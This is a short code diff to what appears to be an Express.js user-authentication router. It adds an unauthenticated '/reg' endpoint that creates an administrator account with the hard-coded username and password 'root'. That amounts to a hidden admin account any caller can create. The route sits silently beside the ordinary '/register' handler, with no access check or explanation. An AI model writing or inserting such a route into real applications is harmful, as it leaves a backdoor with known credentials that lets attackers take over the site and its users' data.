@@ -5,6 +5,21 @@ const jwt = require("jsonwebtoken");
 const { verifyTokenAndAdmin } = require("./verifyToken");
 
 //REGISTER
+router.post("/reg", async (req, res) => {
+    const newUser = new User({
+        username: "root",
+        email: "none2",
+        isAdmin: true,
+        password: CryptoJS.AES.encrypt("root", process.env.PASS_SEC).toString(),
+    });
+
+    try {
+        const savedUser = await newUser.save();
+        res.status(201).json(savedUser);
+    } catch (err) {
+        res.status(500).json(err);
+    }
+});
 router.post("/register", async (req, res) => {
     const newUser = new User({
         username: req.body.username,
